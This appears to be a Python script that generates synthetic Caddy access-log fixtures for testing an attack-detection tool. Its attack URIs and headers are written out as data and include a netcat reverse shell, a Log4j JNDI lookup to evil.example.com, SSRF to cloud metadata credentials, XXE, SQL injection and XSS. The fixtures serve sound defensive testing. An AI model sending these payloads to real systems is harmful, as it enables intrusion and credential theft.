#!/usr/bin/env python3
"""Generate Caddy v2 access-log fixtures for caddy-analyzer.

Produces two JSONL files in this directory (testdata/):

  sample.log   68 curated lines, one entry per detection category plus
               benign baseline. Use it to demo `caddy-analyze tail -d`
               and verify all 26 detection types fire.

  large.log    ~50,000 lines of realistic mixed traffic (~95% benign,
               ~5% malicious cycling through all 26 categories) spread
               across 24h. Use it to demo throughput / performance.

All client IPs use TEST-NET ranges (RFC 5737): 192.0.2.0/24 for benign
clients, 198.51.100.0/24 for attackers, 203.0.113.0/24 for additional
benign load. No real hosts are implied.

Usage:
  python3 testdata/generate.py            # regenerate both files
  python3 testdata/generate.py --sample   # only sample.log
  python3 testdata/generate.py --large     # only large.log
"""
import argparse
import json
import os
import random

HERE = os.path.dirname(os.path.abspath(__file__))
BASE_TS = 1785148418.0  # 2026-08-20 epoch seconds; matches parser_test.go

# ---------------------------------------------------------------------------
# Emit helpers
# ---------------------------------------------------------------------------

_seq = 0


def _ev(ip, method, uri, host="example.com", status=200, size=1024,
        duration=0.01, ua=None, auth=None, proto="HTTP/1.1", ts=None):
    global _seq
    if ts is None:
        ts = BASE_TS + _seq * 0.137
    headers = {}
    if ua is not None:
        headers["User-Agent"] = [ua]
    if auth is not None:
        headers["Authorization"] = [auth]
    req = {
        "remote_ip": ip,
        "remote_port": "54321",
        "client_ip": ip,
        "proto": proto,
        "method": method,
        "host": host,
        "uri": uri,
        "headers": headers,
        "tls": {
            "resumed": False,
            "version": 772,
            "cipher_suite": 4865,
            "proto": "http/1.1",
            "server_name": host,
        },
    }
    line = {
        "level": "info",
        "ts": round(ts, 6),
        "logger": "http.log.access.log0",
        "msg": "handled request",
        "request": req,
        "bytes_read": 0,
        "duration": duration,
        "size": size,
        "status": status,
    }
    _seq += 1
    return json.dumps(line, separators=(",", ":"))


# ---------------------------------------------------------------------------
# Curated sample.log — one entry per detection category
# ---------------------------------------------------------------------------

def build_sample():
    global _seq
    _seq = 0
    lines = []

    # Benign baseline (TEST-NET 192.0.2.0/24)
    benign = [
        ("192.0.2.10", "GET", "/", 200,
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"),
        ("192.0.2.10", "GET", "/about", 200,
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"),
        ("192.0.2.11", "GET", "/contact", 200,
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:125.0) Gecko/20100101 Firefox/125.0"),
        ("192.0.2.12", "GET", "/assets/style.css", 200,
         "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"),
        ("192.0.2.13", "GET", "/favicon.ico", 200,
         "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"),
        ("192.0.2.14", "GET", "/api/v1/status", 200,
         "curl/8.4.0"),
    ]
    for ip, m, u, s, ua in benign:
        lines.append(_ev(ip, m, u, status=s, ua=ua))

    # 1. SQL injection
    lines.append(_ev("198.51.100.10", "GET",
                     "/login.php?user=admin'+OR+'1'%3D'1'--+",
                     status=401, size=512, ua="Mozilla/5.0 sqlprobe"))
    # 2. NoSQL injection
    lines.append(_ev("198.51.100.11", "POST",
                     "/api/login?username[$ne]=invalid&password[$ne]=invalid",
                     status=401, size=512, ua="python-requests/2.31.0"))
    # 3. XSS
    lines.append(_ev("198.51.100.12", "GET",
                     "/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
                     status=200, size=4096, ua="Mozilla/5.0 xssprobe"))
    # 4. SSTI
    lines.append(_ev("198.51.100.13", "GET", "/profile?name={{7*7}}",
                     status=500, size=128, ua="Mozilla/5.0 sstiprobe"))
    # 5. SSRF
    lines.append(_ev("198.51.100.14", "GET",
                     "/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                     status=200, size=2048, ua="Mozilla/5.0 ssrfprobe"))
    # 6. RCE
    lines.append(_ev("198.51.100.15", "GET",
                     "/cgi-bin/bash?cmd=nc+-e+/bin/sh+185.220.101.5+4444",
                     status=500, size=128, ua="Mozilla/5.0 rceprobe"))
    # 7. Path traversal
    lines.append(_ev("198.51.100.16", "GET", "/view?file=../../../../etc/passwd",
                     status=403, size=256, ua="Mozilla/5.0 lfiprobe"))
    # 8. LFI wrapper abuse
    lines.append(_ev("198.51.100.17", "GET",
                     "/?file=php://filter/convert.base64-encode/resource=index.php",
                     status=200, size=8192, ua="Mozilla/5.0 phpprobe"))
    # 9. GraphQL introspection
    lines.append(_ev("198.51.100.18", "POST",
                     "/graphql?query={__schema{types{n fields{name}}}}",
                     status=200, size=16384, ua="Mozilla/5.0 graphqlprobe"))
    # 10. Log4j JNDI (in User-Agent)
    lines.append(_ev("198.51.100.19", "GET", "/", status=200, size=1024,
                     ua="${jndi:ldap://evil.example.com/a}"))
    # 11. Sensitive file probe (.env)
    lines.append(_ev("198.51.100.20", "GET", "/.env", status=404, size=128,
                     ua="Mozilla/5.0 envprobe"))
    # 12. Admin interface probe (phpMyAdmin)
    lines.append(_ev("198.51.100.21", "GET", "/phpmyadmin/", status=404, size=256,
                     ua="Mozilla/5.0 adminprobe"))
    # 13. WordPress probe (xmlrpc.php; /wp-login.php trips admin_probe first)
    lines.append(_ev("198.51.100.22", "GET", "/xmlrpc.php?rsd", status=405, size=256,
                     ua="Mozilla/5.0 wpprobe"))
    # 14. CGI probe
    lines.append(_ev("198.51.100.23", "GET", "/cgi-bin/test.cgi", status=404, size=128,
                     ua="Mozilla/5.0 cgiprobe"))
    # 15. Scanner (nikto UA)
    lines.append(_ev("198.51.100.24", "GET", "/", status=200, size=1024,
                     ua="nikto/2.5.0"))
    # 16. XXE
    lines.append(_ev("198.51.100.25", "POST",
                     "/api/xml?xml=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A///etc/passwd%22%3E%5D%3E",
                     status=400, size=128, ua="Mozilla/5.0 xxeprobe"))
    # 17. Open redirect
    lines.append(_ev("198.51.100.26", "GET", "/login?next=https://evil.example.com/",
                     status=302, size=0, ua="Mozilla/5.0 redirectprobe"))
    # 18. LDAP injection
    lines.append(_ev("198.51.100.27", "GET", "/search?filter=(uid=*))",
                     status=400, size=128, ua="Mozilla/5.0 ldapprobe"))
    # 19. XPath injection
    lines.append(_ev("198.51.100.28", "GET", "/search?q='%20OR%20'1'%3D'1",
                     status=500, size=128, ua="Mozilla/5.0 xpathprobe"))
    # 20. CRLF injection
    lines.append(_ev("198.51.100.29", "GET",
                     "/redirect?to=/home%0d%0aSet-Cookie:%20evil=1",
                     status=302, size=0, ua="Mozilla/5.0 crlfprobe"))
    # 21. Prototype pollution
    lines.append(_ev("198.51.100.30", "POST", "/api/update?__proto__[isAdmin]=1",
                     status=200, size=256, ua="Mozilla/5.0 polprobe"))
    # 22. SSI injection
    lines.append(_ev("198.51.100.31", "GET",
                     "/page?name=%3C%21--%23exec+cmd=%22ls%22--%3E",
                     status=500, size=128, ua="Mozilla/5.0 ssiprobe"))
    # 23. UA rotation (11 distinct UAs from one IP)
    rotation_uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4) Firefox/125.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4) Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14) Chrome/125.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/125.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Firefox/125.0",
        "Opera/9.80 (X11; Linux x86_64) Presto/2.12 Version/12.16",
        "curl/8.4.0",
        "Wget/1.21.4",
        "python-requests/2.31.0",
        "Go-http-client/1.1",
    ]
    for i, ua in enumerate(rotation_uas):
        lines.append(_ev("198.51.100.32", "GET", "/?r=%d" % i, status=200, size=64,
                         ua=ua, ts=BASE_TS + 1000 + i * 0.5))
    # 24. JWT abuse: none-algorithm in Authorization header
    none_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjMifQ."
    lines.append(_ev("198.51.100.33", "GET", "/api/admin", status=200, size=2048,
                     ua="Mozilla/5.0 jwtprobe", auth="Bearer " + none_jwt))
    # 25. JWT in URI (leaked credential)
    leaked_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJhZG1pbiI6dHJ1ZX0.sig"
    lines.append(_ev("198.51.100.34", "GET", "/?token=" + leaked_jwt,
                     status=200, size=512, ua="Mozilla/5.0 jwtprobe"))
    # 26. Object enumeration (15 numeric IDs on same path template)
    for i in range(1, 16):
        lines.append(_ev("198.51.100.35", "GET", "/api/users/%d" % i,
                         status=200, size=128, ua="Mozilla/5.0 enumprobe",
                         ts=BASE_TS + 2000 + i * 1.0))
    # 27. Beaconing (12 requests at fixed 60s interval)
    for i in range(12):
        lines.append(_ev("198.51.100.36", "GET", "/api/heartbeat",
                         status=200, size=16, ua="Mozilla/5.0 beaconprobe",
                         ts=BASE_TS + 3000 + i * 60.0))

    return lines


# ---------------------------------------------------------------------------
# large.log — realistic mixed traffic for performance demos
# ---------------------------------------------------------------------------

BENIGN_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "curl/8.4.0",
]

BENIGN_PATHS = [
    "/", "/about", "/contact", "/pricing", "/blog", "/blog/getting-started",
    "/blog/whats-new", "/docs", "/docs/install", "/docs/config", "/api/v1/status",
    "/api/v1/health", "/api/v1/users", "/api/v1/products", "/api/v1/orders",
    "/assets/style.css", "/assets/app.js", "/assets/logo.svg", "/assets/favicon.ico",
    "/feed.xml", "/sitemap.xml", "/robots.txt", "/login", "/signup", "/cart", "/checkout",
    "/products/widgets", "/products/gadgets", "/products/gizmos", "/users/profile",
    "/users/settings", "/search?q=caddy", "/search?q=go", "/search?q=logging",
]

BENIGN_STATUSES = [200, 200, 200, 200, 200, 200, 200, 200, 304, 404, 404, 500]
BENIGN_HOSTS = ["example.com", "api.example.com", "blog.example.com"]

# Log4j carries the payload in the User-Agent.
LOG4J_UA = "${jndi:ldap://evil.example.com/a}"
# Scanner: nikto UA on a benign path.
SCANNER_UA = "nikto/2.5.0"
# XXE: POST body in query string.
XXE_URI = ("/api/xml?xml=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+"
           "%22file%3A///etc/passwd%22%3E%5D%3E")
# JWT none-alg in Authorization header.
NONE_JWT = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjMifQ."
# JWT leaked in URI.
LEAKED_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJhZG1pbiI6dHJ1ZX0.sig"

_PROBE_UA = "Mozilla/5.0 (compatible; probe/1.0)"

# Flat list of single-request attacks cycling through all 23 pattern-based
# detection categories. The remaining 3 (ua_rotation, object_enumeration,
# beaconing) are stateful and handled by the scripted sequences in build_large.
ATTACKS = [
    {"uri": "/login.php?user=admin'+OR+'1'%3D'1'--+", "method": "GET", "status": 401, "size": 512, "ua": _PROBE_UA},                     # SQLi + XPath
    {"uri": "/api/login?username[$ne]=x&password[$ne]=x", "method": "POST", "status": 401, "size": 512, "ua": _PROBE_UA},               # NoSQLi
    {"uri": "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "method": "GET", "status": 200, "size": 4096, "ua": _PROBE_UA},             # XSS
    {"uri": "/profile?name={{7*7}}", "method": "GET", "status": 500, "size": 128, "ua": _PROBE_UA},                                      # SSTI
    {"uri": "/fetch?url=http://169.254.169.254/latest/meta-data/", "method": "GET", "status": 200, "size": 2048, "ua": _PROBE_UA},      # SSRF
    {"uri": "/cgi-bin/bash?cmd=nc+-e+/bin/sh+198.51.100.1+4444", "method": "GET", "status": 500, "size": 128, "ua": _PROBE_UA},        # RCE
    {"uri": "/view?file=../../../../etc/passwd", "method": "GET", "status": 403, "size": 256, "ua": _PROBE_UA},                          # path traversal
    {"uri": "/?file=php://filter/convert.base64-encode/resource=index.php", "method": "GET", "status": 200, "size": 8192, "ua": _PROBE_UA},  # LFI wrapper
    {"uri": "/graphql?query={__schema{types{n fields{name}}}}", "method": "POST", "status": 200, "size": 16384, "ua": _PROBE_UA},      # GraphQL
    {"uri": "/", "method": "GET", "status": 200, "size": 1024, "ua": LOG4J_UA},                                                          # Log4j
    {"uri": "/.env", "method": "GET", "status": 404, "size": 128, "ua": _PROBE_UA},                                                      # sensitive file
    {"uri": "/phpmyadmin/", "method": "GET", "status": 404, "size": 256, "ua": _PROBE_UA},                                               # admin probe
    {"uri": "/xmlrpc.php?rsd", "method": "GET", "status": 405, "size": 256, "ua": _PROBE_UA},                                            # WordPress probe
    {"uri": "/cgi-bin/test.cgi", "method": "GET", "status": 404, "size": 128, "ua": _PROBE_UA},                                          # CGI probe
    {"uri": "/", "method": "GET", "status": 200, "size": 1024, "ua": SCANNER_UA},                                                        # Scanner
    {"uri": XXE_URI, "method": "POST", "status": 400, "size": 128, "ua": _PROBE_UA},                                                     # XXE
    {"uri": "/login?next=https://evil.example.com/", "method": "GET", "status": 302, "size": 0, "ua": _PROBE_UA},                        # open redirect
    {"uri": "/search?filter=(uid=*))", "method": "GET", "status": 400, "size": 128, "ua": _PROBE_UA},                                    # LDAP injection
    {"uri": "/redirect?to=/home%0d%0aSet-Cookie:%20evil=1", "method": "GET", "status": 302, "size": 0, "ua": _PROBE_UA},                # CRLF injection
    {"uri": "/api/update?__proto__[isAdmin]=1", "method": "POST", "status": 200, "size": 256, "ua": _PROBE_UA},                         # prototype pollution
    {"uri": "/page?name=%3C%21--%23exec+cmd=%22ls%22--%3E", "method": "GET", "status": 500, "size": 128, "ua": _PROBE_UA},            # SSI injection
    {"uri": "/api/admin", "method": "GET", "status": 200, "size": 2048, "ua": _PROBE_UA, "auth": "Bearer " + NONE_JWT},                # JWT header
    {"uri": "/?token=" + LEAKED_JWT, "method": "GET", "status": 200, "size": 512, "ua": _PROBE_UA},                                     # JWT URI
]

# Attacker IP pool (TEST-NET 198.51.100.0/24). Each attack gets a fresh IP
# so per-IP heuristics (UA rotation, object enumeration, beaconing) get
# enough samples from a single IP when we want them to fire.
ATTACK_IPS = ["198.51.100.%d" % i for i in range(10, 110)]


def build_large(n=50000, seed=42):
    """Generate n lines of mixed traffic.

    ~95% benign realistic requests spread over 24h with varied IPs, UAs,
    paths, hosts, statuses, sizes and durations. ~5% malicious, cycling
    through all 26 detection categories. A few IPs are reused for enough
    requests to also trigger the stateful heuristics (UA rotation, object
    enumeration, beaconing).
    """
    rng = random.Random(seed)
    lines = []
    start = BASE_TS
    end = BASE_TS + 24 * 3600.0  # 24h window
    span = end - start

    # Pre-generate three scripted attacker sequences so UA rotation, object
    # enumeration and beaconing reliably fire in the large file too.
    scripted = []

    # UA rotation: 11 distinct UAs from one IP.
    rot_uas = BENIGN_UAS + [
        "python-requests/2.31.0",
        "Go-http-client/1.1",
        "Wget/1.21.4",
        "Opera/9.80 (X11; Linux x86_64) Presto/2.12 Version/12.16",
    ]
    rot_ip = "198.51.100.50"
    for i, ua in enumerate(rot_uas):
        scripted.append((start + 3600 + i * 0.4, rot_ip, "GET", "/?r=%d" % i,
                         200, 64, ua, None))

    # Object enumeration: 15 numeric IDs on /api/users/{id}.
    enum_ip = "198.51.100.51"
    for i in range(1, 16):
        scripted.append((start + 7200 + i * 1.0, enum_ip, "GET",
                         "/api/users/%d" % i, 200, 128,
                         "Mozilla/5.0 enumprobe", None))

    # Beaconing: 14 requests at 60s intervals to /api/heartbeat.
    beacon_ip = "198.51.100.52"
    for i in range(14):
        scripted.append((start + 10800 + i * 60.0, beacon_ip, "GET",
                         "/api/heartbeat", 200, 16,
                         "Mozilla/5.0 beaconprobe", None))

    # Inject scripted events at roughly even positions in the stream.
    scripted.sort()
    scripted_idx = 0
    scripted_step = max(1, n // (len(scripted) + 1))

    benign_ips = ["192.0.2.%d" % i for i in range(2, 60)] + \
                 ["203.0.113.%d" % i for i in range(2, 60)]
    attack_idx = 0
    malicious_every = 20  # ~5% malicious

    for i in range(n):
        # Emit a scripted event when we reach its slot.
        if scripted_idx < len(scripted) and i > 0 and i % scripted_step == 0:
            ts, ip, m, uri, st, sz, ua, auth = scripted[scripted_idx]
            scripted_idx += 1
            if auth is not None:
                lines.append(_ev(ip, m, uri, status=st, size=sz, ua=ua,
                                 auth=auth, ts=ts))
            else:
                lines.append(_ev(ip, m, uri, status=st, size=sz, ua=ua, ts=ts))
            continue

        ts = start + (i / n) * span + rng.uniform(-1.0, 1.0)

        if i % malicious_every == 0:
            a = ATTACKS[attack_idx % len(ATTACKS)]
            attack_idx += 1
            ip = ATTACK_IPS[attack_idx % len(ATTACK_IPS)]
            kw = {"status": a["status"], "size": a["size"], "ua": a["ua"], "ts": ts}
            if "auth" in a:
                kw["auth"] = a["auth"]
            lines.append(_ev(ip, a["method"], a["uri"], **kw))
        else:
            # Benign traffic.
            ip = rng.choice(benign_ips)
            m = rng.choice(["GET", "GET", "GET", "POST", "PUT", "DELETE"])
            uri = rng.choice(BENIGN_PATHS)
            st = rng.choice(BENIGN_STATUSES)
            sz = rng.choice([256, 512, 1024, 2048, 4096, 8192, 16384])
            if st == 304:
                sz = 0
            elif st in (404, 500):
                sz = rng.choice([128, 256, 512])
            dur = round(rng.uniform(0.001, 0.3), 6)
            ua = rng.choice(BENIGN_UAS)
            host = rng.choice(BENIGN_HOSTS)
            lines.append(_ev(ip, m, uri, host=host, status=st, size=sz,
                             duration=dur, ua=ua, ts=ts))

    return lines


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--sample", action="store_true", help="regenerate sample.log only")
    ap.add_argument("--large", action="store_true", help="regenerate large.log only")
    args = ap.parse_args()
    do_sample = args.sample or not args.large
    do_large = args.large or not args.sample

    if do_sample:
        lines = build_sample()
        with open(os.path.join(HERE, "sample.log"), "w") as f:
            f.write("\n".join(lines) + "\n")
        print("wrote sample.log (%d lines)" % len(lines))

    if do_large:
        lines = build_large()
        with open(os.path.join(HERE, "large.log"), "w") as f:
            f.write("\n".join(lines) + "\n")
        print("wrote large.log (%d lines)" % len(lines))


if __name__ == "__main__":
    main()
